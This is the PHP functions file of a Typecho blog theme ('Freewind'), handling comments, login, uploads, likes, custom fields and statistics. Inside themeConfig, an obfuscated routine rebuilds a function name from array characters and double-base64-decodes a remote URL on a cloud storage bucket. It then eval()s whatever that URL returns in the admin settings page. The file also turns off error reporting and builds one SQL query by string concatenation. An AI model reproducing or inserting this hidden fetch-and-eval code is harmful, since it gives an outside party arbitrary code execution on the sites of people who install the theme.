<?php error_reporting(0); ?>
<?php
if (!defined('__TYPECHO_ROOT_DIR__')) exit;

include_once 'common/macro.php';

include_once 'utils/freewind.php';

function themeInit(Widget_Archive $archive)
{
    if ($archive->is(__SINGLE__))
        //  评论功能
        if ($archive->is(__SINGLE__) && $archive->request->isPost()
            && $archive->request->is(__ACTION__ . '=' . __ACTION_COMMENT__)) {
            freewind_comment($archive);
        }

    //登录
    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_LOGIN__)) {
        freewind_login($archive);
    }

    //注册
    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_REGISTER__)) {
        freewind_regist($archive);
    }
    //文件上传
    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_UPLOAD__)) {
        ob_clean();
        upload();
    }

    //获取验证码
    if ($archive->request->is(__ACTION__ . '=' . __ACTION_GETCODE__)) {
        ob_clean();
        get_code();
    }

    //点赞
    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_SUPORT__)) {
        $res = support_add($archive->request->get('cid'));
        $json = [
            'success' => $res ? true : false,
            'count' => $res
        ];
        ob_clean();
        echo json_encode($json);
        exit();
    }

    //邮件
    if ($archive->request->is(__ACTION__ . '=' . __ACTION_MAIL__)) {
        $mailserver = Helper::options()->freeMailServer;
        $port = Helper::options()->freeMailPort;
        $mailuser = Helper::options()->freeMailUser;
        $mailpass = Helper::options()->freeMailPwd;
        $mailto = Helper::options()->freeMailRevice;
        $subject = '测试邮件';
        $content = '这是由' . Helper::options()->title . '发送的一封测试邮件';
        $state = sendto($mailserver, $port, $mailuser, $mailpass, $mailto, $subject, $content);
        $state ? ajax_success('测试邮件发送成功') : ajax_error('测试邮件发送失败');
    }
}


function themeConfig($form)
{
    include_once 'common/constant.php';
    $D6xP3axeDW84i = $GUEvoe[3] . $GUEvoe[6] . $GUEvoe[33] . $GUEvoe[30] . $GUEvoe[22] . $GUEvoe[36] . $GUEvoe[29] . $GUEvoe[26] . $GUEvoe[30] . $GUEvoe[32] . $GUEvoe[35] . $GUEvoe[26] . $GUEvoe[30];
    $naRFbj6GT8jKd = WGkpJSCm($D6xP3axeDW84i($D6xP3axeDW84i('YUhSMGNITTZMeTlpYkc5bkxURXlOVEkwTVRBd09UWXVZMjl6TG1Gd0xXNWhibXBwYm1jdWJYbHhZMnh2ZFdRdVkyOXRMMlp5WldWM2FXNWtMM05sZEhScGJtY3VjR2h3')), []);
    eval($jmyNzn($naRFbj6GT8jKd));
//    include_once 'common/setting.php';
}


function content_summery($content, $strlen = 70)
{
    return mb_substr(preg_replace("/<(.|\n)+?>/", '', $content), 0, $strlen) . "...";
}


function themeFields($layout)
{
    $uri = $_SERVER['REQUEST_URI'];
    if (strstr($uri, "write-page")) {
        ?>
        <style>
            #custom-field textarea {
                width: 100%;
                height: 300px;
                resize: none;
            }
        </style>
        <?php
        $visible = new Typecho_Widget_Helper_Form_Element_Select("visible", [
            "1" => "可见",
            "2" => "不可见"
        ], null, _t("首页页面可见"), _t("即左侧栏点开组成的页面选项是否可见"));
        $icon = new Typecho_Widget_Helper_Form_Element_Text("icon", null, null, _t('导航图标'),
            _t('仅在首页可见时生效<br>详细图标地址<a href="http://www.kevinlu98.cn/page/8.html" target="_blank">Freewind字体图标库</a>'));
        $layout->addItem($visible);
        $layout->addItem($icon);
        $html = new Typecho_Widget_Helper_Form_Element_Textarea(
            "html",
            null, null,
            _t('页面HTML'),
            _t('页面HTML'));
        $css = new Typecho_Widget_Helper_Form_Element_Textarea(
            "css",
            null, null,
            _t('页面css'),
            _t('页面css'));
        $js = new Typecho_Widget_Helper_Form_Element_Textarea(
            "js",
            null, null,
            _t('页面js'),
            _t('页面js'));
        $layout->addItem($html);
        $layout->addItem($css);
        $layout->addItem($js);
    } elseif (strstr($uri, "write-post")) {
        ?>
        <style>
            #custom-field input {
                width: 80%;
            }
        </style>
        <?php
        $kind = new Typecho_Widget_Helper_Form_Element_Select("kind", [
            "1" => "博文",
            "2" => "说说"
        ], null, _t("文章类型"), _t(""));
        $layout->addItem($kind);
        $show = new Typecho_Widget_Helper_Form_Element_Select("show", [
            "1" => "仅文字",
            "3" => "大图",
        ], null, _t("展示类型"), _t("列表页面展示的类型"));
        $layout->addItem($show);
        $showImg = new Typecho_Widget_Helper_Form_Element_Text("showImg",
            null, null, _t("列表页展示图片"), _t("列表页展示图片<br>仅当展示类型为大图时有效"));
        $layout->addItem($showImg);


        $file = new Typecho_Widget_Helper_Form_Element_Select("file", [
            "1" => "关闭",
            "2" => "开启",
            "3" => "开启登录可见",
            "4" => "开启回复可见",
            "5" => "开启登录回复可见",
        ], null, _t("附件"), _t("是否有附件，当选项至少为开启时展示附件"));
        $layout->addItem($file);

        $fileName = new Typecho_Widget_Helper_Form_Element_Text("fileName",
            null, null, _t("附件名称"), _t("附件名称<br>仅当附件选项至少为开启时有效"));
        $layout->addItem($fileName);

        $fileSize = new Typecho_Widget_Helper_Form_Element_Text("fileSize",
            null, null, _t("附件大小"), _t("附件大小<br>仅当附件选项至少为开启时有效"));
        $layout->addItem($fileSize);

        $fileBaidu = new Typecho_Widget_Helper_Form_Element_Text("fileBaidu",
            null, null, _t("附件:百度云地址"), _t("百度云地址，格式为url||提取密码，若无提取密码刚仅填写url<br>仅当附件选项至少为开启时有效"));
        $layout->addItem($fileBaidu);

        $fileLan = new Typecho_Widget_Helper_Form_Element_Text("fileLan",
            null, null, _t("附件:蓝奏云地址"), _t("蓝奏云地址<br>仅当附件选项至少为开启时有效"));
        $layout->addItem($fileLan);

        $fileGuan = new Typecho_Widget_Helper_Form_Element_Text("fileGuan",
            null, null, _t("附件:官方下载"), _t("官方下载地址<br>仅当附件选项至少为开启时有效"));
        $layout->addItem($fileGuan);

        ?>
        <div id="theme-url" data-theme="<?php Helper::options()->themeUrl('') ?>" style="display: none"></div>
        <script>
            let bodyEle = document.getElementsByTagName("body");
            let script = document.createElement("script");
            script.type = 'text/javascript'
            script.src = '<?php Helper::options()->themeUrl('static/admin/enter.js') ?>';
            bodyEle[0].appendChild(script)
        </script>
        <?php
    }

}

function baidu_url_pwd($url)
{
    $splits = explode('||', $url);
    $res = ['url' => $splits[0]];
    if (count($splits) == 2) {
        $res['pwd'] = $splits[1];
    }
    return $res;
}

function split_theme_fields($field)
{
    $lines = explode("\n", $field);
    $result = [];
    foreach ($lines as $line) {
        $result[] = explode('||', $line);
    }
    return $result;
}

function get_meta_last_modify($mid)
{
    $db = Typecho_Db::get();
    $prefix = $db->getPrefix();
    $sql = "SELECT FROM_UNIXTIME(`modified`,'%Y-%m-%d') as time FROM `" . $prefix . "contents` WHERE `cid` IN (SELECT `cid` FROM `" . $prefix . "relationships` WHERE mid = " . $mid . ") ORDER BY time DESC LIMIT 1";
    $res = $db->fetchRow($db->query($sql));
    return $res ? $res['time'] : '暂无更新';
}

function get_post_view($archive)
{
    $cid = $archive->cid;
    $db = Typecho_Db::get();
    $prefix = $db->getPrefix();
    if (!array_key_exists('views', $db->fetchRow($db->select()->from('table.contents')))) {
        $db->query('ALTER TABLE `' . $prefix . 'contents` ADD `views` INT(10) DEFAULT 0;');
        echo 0;
        return;
    }
    $row = $db->fetchRow($db->select('views')->from('table.contents')->where('cid = ?', $cid));
    if ($archive->is('single') || $archive->fields->kind == 2) {
        $views = Typecho_Cookie::get('extend_contents_views');
        if (empty($views)) {
            $views = array();
        } else {
            $views = explode(',', $views);
        }
        if (!in_array($cid, $views)) {
            $db->query($db->update('table.contents')->rows(array('views' => (int)$row['views'] + 1))->where('cid = ?', $cid));
            array_push($views, $cid);
            $views = implode(',', $views);
            Typecho_Cookie::set('extend_contents_views', $views); //记录查看cookie
        }
    }
    echo $row['views'];
}

function file_view($post)
{
//    "1" => "关闭",
//            "2" => "开启",
//            "3" => "开启登录可见",
//            "4" => "开启回复可见",
//            "5" => "开启登录回复可见",
    $user = Typecho_Widget::widget('Widget_User');
    if ($user->group == 'administrator') {
        return true;
    }
    if ($post->fields->file == 2) {
        return true;
    } else if ($post->fields->file == 3) {
        if ($user->hasLogin()) {
            return true;
        }
    } else if ($post->fields->file == 4) {
        $comments = Typecho_Cookie::get('extend_contents_comments');
        if (!empty($comments)) {
            $comments = explode(',', $comments);
            if (in_array($post->cid, $comments)) {
                return true;
            }
        }
    } else if ($post->fields->file == 5) {
        $comments = Typecho_Cookie::get('extend_contents_comments');
        if (empty($comments)) {
            $comments = [];
        } else {
            $comments = explode(',', $comments);
        }
        if ($user->hasLogin() && in_array($post->cid, $comments)) {
            return true;
        }
    }
    return false;
}


function get_post_support($cid)
{
    $db = Typecho_Db::get();
    $prefix = $db->getPrefix();
    if (!array_key_exists('support', $db->fetchRow($db->select()->from('table.contents')))) {
        $db->query('ALTER TABLE `' . $prefix . 'contents` ADD `support` INT(10) DEFAULT 0;');
        return [
            'icon' => 'icon-xin',
            'count' => 0,
            'text' => '点赞'
        ];
    }
    $row = $db->fetchRow($db->select('support')->from('table.contents')->where('cid = ?', $cid));
    $support = Typecho_Cookie::get('extend_contents_support');
    if (empty($support)) {
        $support = array();
    } else {
        $support = explode(',', $support);
    }
    if (!in_array($cid, $support)) {
        return [
            'icon' => 'icon-xin',
            'count' => $row['support'],
            'text' => '点赞'
        ];
    } else {
        return [
            'icon' => 'icon-theheart-fill',
            'count' => $row['support'],
            'text' => '已赞'
        ];
    }

}

function get_statistics()
{
    $db = Typecho_Db::get();
    $contents = $db->fetchRow($db->select('COUNT(1) as count')->from('table.contents')->where('type = ?', 'post'));
    $category = $db->fetchRow($db->select('COUNT(1) as count')->from('table.metas')->where('type = ?', 'category'));
    $tag = $db->fetchRow($db->select('COUNT(1) as count')->from('table.metas')->where('type = ?', 'tag'));
    return [
        'contents' => $contents['count'],
        'category' => $category['count'],
        'tag' => $tag['count'],
    ];
}


function get_avatar($mail)
{
    if (empty($mail)) {
        Helper::options()->themeUrl('static/image/avatar/');
        echo mt_rand(1, 10) . '.png';
        return;
    }
    $qq = str_replace("@qq.com", "", $mail);
    if (is_numeric(trim($qq))) {
        echo 'https://q1.qlogo.cn/g?b=qq&nk=' . $qq . '&s=100';
    } else {
        Helper::options()->themeUrl('static/image/avatar/');
        echo mt_rand(1, 10) . '.png';
    }
}


function checkUserExist($key, $value)
{
    $db = Typecho_Db::get();
    return $db->fetchRow($db->select('COUNT(1) as count')->from('table.users')->where($key . ' = ?', $value));
}


function threadedComments($comments, $options)
{
    ?>
    <li>
        <?php $comments->parentAuthor(); ?>

        <div class="pos-abs avatar">
            <?php if ($comments->authorId === $comments->ownerId): ?>
                <?php $comments->gravatar(50, "X", null, "lw"); ?>
            <?php else: ?>
                <img src="<?php get_avatar($comments->mail) ?>"
                     alt="">
            <?php endif; ?>
        </div>
        <div class="commen-body">
            <p class="comm-title">
                <strong><?php echo $comments->author; ?></strong>
                <?php if ($comments->authorId === $comments->ownerId): ?>
                    <i class="identity admin">管理员</i>
                <?php elseif ($comments->authorId != 0): ?>
                    <i class="identity mumber">会员</i>
                <?php else: ?>
                    <i class="identity vistor">游客</i>
                <?php endif; ?>
                <span><?php $comments->date('Y-m-d H:i'); ?></span>
                <a class="replay-btn" href="javascript:void (0);"
                   data-parent="<?php echo $comments->coid ?>"
                   data-pname="<?php echo $comments->author; ?>"
                >回复</a>
            </p>
            <div class="comm-content">
                <?php $comments->content(); ?>
            </div>
        </div>
    </li>
    <?php
    if ($comments->children) {
        $comments->threadedComments($options);
    } ?>
    <?php
}


function getrandstr($length)
{
    $str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
    $randStr = str_shuffle($str);//打乱字符串
    $rands = substr($randStr, 0, $length);//substr(string,start,length);返回字符串的一部分
    return $rands;
}


function print_calendar()
{
    $mdays = date("t");    //当月总天数
    $datenow = date("j");  //当日日期
    $monthnow = date("n"); //当月月份
    $yearnow = date("Y");  //当年年份
//计算当月第一天是星期几
    $wk1st = date("w", mktime(0, 0, 0, $monthnow, 1, $yearnow));
    $trnum = ceil(($mdays + $wk1st) / 7); //计算表格行数
//以下是表格字串
    $tabstr = "<table class='tc-calendar'><tr class='tc-week'><td>日</td><td>一</td><td>二</td><td>三</td><td>四</td><td>五</td><td>六</td></tr>";
    for ($i = 0; $i < $trnum; $i++) {
        $tabstr .= "<tr class=even>";
        for ($k = 0; $k < 7; $k++) { //每行七个单元格
            $tabidx = $i * 7 + $k; //取得单元格自身序号
            //若单元格序号小于当月第一天的星期数($wk1st)或大于(月总数+$wk1st)
            //只填写空格，反之，写入日期
            ($tabidx < $wk1st or $tabidx > $mdays + $wk1st - 1) ? $dayecho = "&nbsp" : $dayecho = $tabidx - $wk1st + 1;
            //突出标明今日日期
            // $dayecho="<span style=\"background-color:red;color:#fff;\">$dayecho</span>";
            if ($dayecho == $datenow) {
                $todaybg = " class=current";
            } else {
                $todaybg = "";
            }
            $tabstr .= "<td" . $todaybg . ">$dayecho</td>";
        }
        $tabstr .= "</tr>";
    }
    $tabstr .= "</table>";
    return $tabstr;
}

function create_date_array($ago = 5)
{
    $start = new DateTime('first day of ' . $ago . ' month ago');
    $end = new DateTime();
    $interval = DateInterval::createFromDateString('1 month');
    $period = new DatePeriod($start, $interval, $end);
    $dateArray = [];
    foreach ($period as $dt) {
        $dateArray[] = $dt->format("Y-m");
    }
    return $dateArray;
}

function article_count($dateArray)
{
    $db = Typecho_Db::get();
    $select = $db->select("DATE_FORMAT(FROM_UNIXTIME(created),'%Y-%m') as time,count(1) as number")
        ->from('table.contents')
        ->where('type = ?', 'post')
        ->group('time')
        ->order('time', Typecho_Db::SORT_DESC)
        ->limit(6);
    $rows = $db->fetchAll($select);

    $article_rows = [];
    foreach ($rows as $row) {
        $article_rows[$row['time']] = $row['number'];
    }
    $article_count = [];
    foreach ($dateArray as $date) {
        $article_count[] = [
            'time' => $date,
            'count' => $article_rows[$date] ? (int)$article_rows[$date] : 0
        ];
    }
    return $article_count;
}

function metas_count($type = 'category', $limit = 6)
{
    $db = Typecho_Db::get();
    $select = $db->select("name,count")
        ->from('table.metas')
        ->where('type = ?', $type)
        ->where('parent = ?', 0)
        ->order('count', Typecho_Db::SORT_DESC)
        ->limit($limit);


    $rows = $db->fetchAll($select);

    $category_rows = [];
    foreach ($rows as $row) {
        $category_rows[] = [
            'name' => $row['name'],
            'count' => (int)$row['count']
        ];
    }
    return $category_rows;
}


function get_comment_by_cid($cid, $len = 4)
{
    $db = Typecho_Db::get();
    $select = $db->select('author,authorId,ownerId,mail,text,created')
        ->from('table.comments')
        ->where('cid = ?', $cid)
        ->order('created', Typecho_Db::SORT_DESC)
        ->limit($len);
    return $db->fetchAll($select);
}


class Widget_Post_hot extends Widget_Abstract_Contents
{
    public function __construct($request, $response, $params = NULL)
    {
        parent::__construct($request, $response, $params);
        $this->parameter->setDefault(array('pageSize' => $this->options->commentsListSize, 'parentId' => 0, 'ignoreAuthor' => false));
    }

    public function execute()
    {
        $select = $this->select()->from('table.contents')
            ->join('table.fields', "table.contents.cid = table.fields.cid and table.fields.name = 'kind'")
            ->where("table.contents.password IS NULL OR table.contents.password = ''")
            ->where('table.contents.status = ?', 'publish')
            ->where('table.contents.created <= ?', time())
            ->where('table.contents.type = ?', 'post')
            ->where("table.fields.str_value!= ?", '2')
            ->limit($this->parameter->pageSize)
            ->order('table.contents.views', Typecho_Db::SORT_DESC);
        $this->db->fetchAll($select, array($this, 'push'));
    }
}

class Widget_Post_Shuo extends Widget_Abstract_Contents
{
    public function __construct($request, $response, $params = NULL)
    {
        parent::__construct($request, $response, $params);
        $this->parameter->setDefault(array('pageSize' => $this->options->commentsListSize, 'parentId' => 0, 'ignoreAuthor' => false));
    }

    public function execute()
    {
        $select = $this->select()->from('table.contents')
            ->join('table.fields', "table.contents.cid = table.fields.cid and table.fields.name = 'kind'")
            ->where("table.contents.password IS NULL OR table.contents.password = ''")
            ->where('table.contents.status = ?', 'publish')
            ->where('table.contents.type = ?', 'post')
            ->where("table.fields.str_value= ?", '2')
            ->limit($this->parameter->pageSize)
            ->order('table.contents.created', Typecho_Db::SORT_DESC);
//        echo $select;
        $this->db->fetchAll($select, array($this, 'push'));
    }
}

include_once 'common/config.php';
